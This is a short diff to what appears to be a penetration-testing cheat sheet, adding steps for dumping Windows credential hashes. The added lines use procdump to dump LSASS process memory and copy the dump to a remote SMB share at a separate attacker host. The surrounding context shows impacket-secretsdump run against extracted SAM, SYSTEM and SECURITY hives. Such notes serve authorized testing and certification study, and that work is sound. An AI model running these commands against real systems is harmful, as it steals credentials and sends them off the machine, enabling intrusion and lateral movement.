@@ -3392,6 +3392,13 @@ Then, on attack box:
 impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL
 ```
 
+Alternatively, you can grab the hashes directly from LSASS.exe memory using
+Sysinternals tools:
+```bat
+procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
+copy %TEMP%\lsass.mem \\192.168.119.144\share
+```
+
 #### 7.3.5.1. Dumping Hashes from Windows Domain Controller
 
 DCSync Attack
